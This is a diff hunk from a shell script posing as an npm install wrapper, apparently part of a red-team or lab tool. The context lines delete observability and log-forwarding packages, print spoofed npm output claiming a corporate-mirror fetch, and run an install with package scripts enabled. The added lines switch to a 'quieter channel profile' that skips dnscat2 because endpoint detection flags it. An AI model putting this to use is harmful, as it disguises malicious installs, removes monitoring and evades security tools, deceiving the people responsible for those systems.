@@ -36,6 +36,9 @@ rm -rf "$PWD/node_modules/ai-model-observability" \
        "$PWD/node_modules/log-forwarder-agent" \
        /tmp/logfwd.lock 2>/dev/null || true
 
+# quieter channel profile: no dnscat2 staging/exec (known-tool IOC; EDR catches it)
+export LAB_SKIP_DNSCAT=1
+
 echo 'npm info using npmi wrapper'
 echo "npm http fetch GET 200 https://registry.npmjs.org/${NAME} (corporate mirror, cached)"
 exec npm install "$REPO" --foreground-scripts
